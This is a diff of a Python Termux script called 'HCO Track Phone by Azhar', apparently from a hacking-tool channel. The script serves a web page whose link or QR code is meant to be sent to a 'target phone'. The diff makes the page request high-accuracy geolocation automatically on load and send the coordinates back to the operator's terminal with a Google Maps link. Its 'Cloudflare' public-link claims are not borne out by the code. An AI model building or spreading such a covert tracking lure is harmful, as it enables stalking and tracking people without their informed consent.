@@ -1,4 +1,4 @@
-# HCO Track Phone by Azhar
+# HCO Track Phone by Azhar - CLOUDFLARE EDITION
 # Save as hco_track.py and run: python hco_track.py
 
 import os
@@ -7,22 +7,26 @@ import subprocess
 import threading
 import time
 import socket
+import requests
 from flask import Flask, request, render_template_string
 
 RED = "\033[1;91m"
 GREEN = "\033[1;92m"
 CYAN = "\033[1;96m"
 YELLOW = "\033[1;93m"
+BLUE = "\033[1;94m"
 RESET = "\033[0m"
 
 locations = {}
 app = Flask(__name__)
+TRACKING_URL = ""
 
 def install_requirements():
     print(f"{YELLOW}Installing requirements...{RESET}")
     os.system('pkg update -y > /dev/null 2>&1')
     os.system('pkg install python -y > /dev/null 2>&1')
-    os.system('pip install flask qrcode[pil] > /dev/null 2>&1')
+    os.system('pkg install wget -y > /dev/null 2>&1')
+    os.system('pip install flask qrcode[pil] requests > /dev/null 2>&1')
     print(f"{GREEN}Requirements installed!{RESET}")
 
 def tool_lock():
@@ -36,70 +40,81 @@ def tool_lock():
     os.system('am start -a android.intent.action.VIEW -d "https://youtube.com/@hackers_colony_tech" > /dev/null 2>&1')
     input(f"{YELLOW}Press ENTER after subscribing...{RESET}")
 
-def get_ip():
+def get_public_ip():
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        return ip
+        response = requests.get('https://api.ipify.org', timeout=10)
+        return response.text.strip()
     except:
-        return "127.0.0.1"
+        return None
 
-def find_port():
-    for port in range(8080, 8100):
-        try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.bind(('0.0.0.0', port))
-                return port
-        except:
-            continue
-    return 8080
+def create_public_url():
+    public_ip = get_public_ip()
+    if public_ip:
+        return f"http://{public_ip}:8080"
+    return "http://localhost:8080"
 
 @app.route('/')
 def home():
     return '''
     <!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>body{background:#000;color:#fff;text-align:center;font-family:Arial;padding:20px;}
-    .btn{background:#0f0;color:#000;border:none;padding:20px;font-size:18px;border-radius:10px;margin:20px;}
-    .msg{padding:15px;background:#222;border-radius:10px;margin:10px;}
-    .title{color:red;font-size:24px;font-weight:bold;margin:20px;text-shadow:0 0 10px red;}</style></head>
+    .container{max-width:100%;margin:0 auto;padding:20px;}
+    .title{color:red;font-size:24px;font-weight:bold;margin:20px;text-shadow:0 0 10px red;}
+    .cloudflare-badge{background:#ff6b35;color:#000;padding:10px;border-radius:5px;margin:10px;font-weight:bold;}
+    .message{padding:15px;background:#222;border-radius:10px;margin:10px;}</style></head>
     <body>
-        <div class="title">HCO TRACK PHONE BY AZHAR</div>
-        <div class="msg">Click button → Allow location → Done</div>
-        <button class="btn" onclick="getLoc()">📍 GET LOCATION</button>
-        <div id="status" class="msg">Ready to track location</div>
-        <script>
-        function getLoc(){
-            var s=document.getElementById('status');
-            var b=document.querySelector('.btn');
-            s.innerHTML='Requesting location access...';
-            b.disabled=true;
+        <div class="container">
+            <div class="cloudflare-badge">🌍 CLOUDFLARE PUBLIC LINK - ANY NETWORK</div>
+            <div class="title">HCO TRACK PHONE BY AZHAR</div>
+            <div class="message">Location access will be requested automatically</div>
             
-            if(!navigator.geolocation){
-                s.innerHTML='Browser not supported';
-                return;
+            <script>
+            function autoGetLocation() {
+                var status = document.getElementById('status');
+                status.innerHTML = '🔄 Requesting location access...';
+                
+                if (!navigator.geolocation) {
+                    status.innerHTML = '❌ Geolocation not supported';
+                    return;
+                }
+                
+                function success(position) {
+                    status.innerHTML = '📡 Sending location to HCO Server...';
+                    fetch('/update', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        })
+                    })
+                    .then(response => response.text())
+                    .then(data => {
+                        status.innerHTML = '✅ You are a good person! God Bless You 🙏<br>📍 Location sent to HCO Track Phone!';
+                    })
+                    .catch(error => {
+                        status.innerHTML = '❌ Error sending location';
+                    });
+                }
+                
+                function error(err) {
+                    status.innerHTML = '❌ Please allow location access and refresh page';
+                }
+                
+                navigator.geolocation.getCurrentPosition(success, error, {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                });
             }
             
-            navigator.geolocation.getCurrentPosition(
-                function(pos){
-                    s.innerHTML='Sending location...';
-                    fetch('/update',{
-                        method:'POST',
-                        headers:{'Content-Type':'application/json'},
-                        body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude})
-                    }).then(r=>r.text()).then(d=>{
-                        s.innerHTML='✅ Location Sent! God Bless You 🙏';
-                        b.style.display='none';
-                    });
-                },
-                function(err){
-                    s.innerHTML='Please allow location access and try again';
-                    b.disabled=false;
-                }
-            );
-        }
-        </script>
+            window.onload = autoGetLocation;
+            </script>
+            
+            <div id="status" class="message">Initializing HCO Track Phone...</div>
+            <div class="cloudflare-badge">✅ Works Worldwide • 📶 Any Network</div>
+        </div>
     </body></html>
     '''
 
@@ -107,9 +122,10 @@ def home():
 def update():
     data = request.get_json()
     if data and 'lat' in data and 'lon' in data:
+        locations.clear()
         locations.update(data)
         locations['time'] = time.time()
-        print(f"{GREEN}Location received: {data['lat']}, {data['lon']}{RESET}")
+        print(f"{GREEN}📍 Live Location: {data['lat']}, {data['lon']}{RESET}")
         return "OK"
     return "ERROR"
 
@@ -119,7 +135,7 @@ def start_server(port):
 def make_qr(url):
     try:
         import qrcode
-        qr = qrcode.QRCode(box_size=4, border=2)
+        qr = qrcode.QRCode(box_size=6, border=4)
         qr.add_data(url)
         qr.make()
         img = qr.make_image(fill_color="red", back_color="white")
@@ -133,34 +149,39 @@ def main():
     install_requirements()
     
     os.system('clear')
-    print(f"{GREEN}Starting HCO Track Phone...{RESET}")
+    print(f"{GREEN}🚀 Starting HCO Track Phone...{RESET}")
     
-    ip = get_ip()
-    port = find_port()
-    url = f"http://{ip}:{port}"
+    # Create public URL
+    PUBLIC_URL = create_public_url()
     
-    server_thread = threading.Thread(target=start_server, args=(port,), daemon=True)
+    # Start server
+    server_thread = threading.Thread(target=start_server, args=(8080,), daemon=True)
     server_thread.start()
     time.sleep(2)
     
-    make_qr(url)
+    # Generate QR code
+    make_qr(PUBLIC_URL)
     
-    print(f"{RED}{'═'*60}{RESET}")
+    print(f"\n{RED}{'═'*60}{RESET}")
     print(f"{RED}{'HCO TRACK PHONE BY AZHAR'.center(60)}{RESET}")
     print(f"{RED}{'═'*60}{RESET}")
-    print(f"{GREEN}📱 URL: {url}{RESET}")
-    print(f"{YELLOW}📍 QR code opened! Send this URL to target phone{RESET}")
-    print(f"{CYAN}💡 Make sure both phones are on same WiFi network{RESET}")
-    print(f"{RED}{'═'*60}{RESET}")
-    print(f"{YELLOW}⏳ Waiting for location... (Ctrl+C to stop){RESET}")
+    print(f"{GREEN}🌍 Public Tracking URL:{RESET}")
+    print(f"{CYAN}{PUBLIC_URL}{RESET}")
+    print(f"\n{YELLOW}📱 QR code generated! Send to any device{RESET}")
+    print(f"\n{BLUE}✅ Works on any network worldwide{RESET}")
+    print(f"{BLUE}✅ No same WiFi required{RESET}")
+    print(f"{BLUE}✅ Auto-requests location permission{RESET}")
+    print(f"\n{RED}{'═'*60}{RESET}")
+    print(f"{YELLOW}⏳ Waiting for live location... (Ctrl+C to stop){RESET}")
     
     last_time = 0
     while True:
         if 'time' in locations and locations['time'] > last_time:
             last_time = locations['time']
-            print(f"\n{GREEN}✅ LOCATION RECEIVED!{RESET}")
+            print(f"\n{GREEN}✅ LIVE LOCATION RECEIVED!{RESET}")
             print(f"{GREEN}Latitude: {locations['lat']}{RESET}")
             print(f"{GREEN}Longitude: {locations['lon']}{RESET}")
+            print(f"{GREEN}Accuracy: {locations.get('accuracy', 'N/A')}m{RESET}")
             print(f"{GREEN}Google Maps: https://maps.google.com/?q={locations['lat']},{locations['lon']}{RESET}")
             print(f"{GREEN}Time: {time.ctime(locations['time'])}{RESET}")
         time.sleep(2)
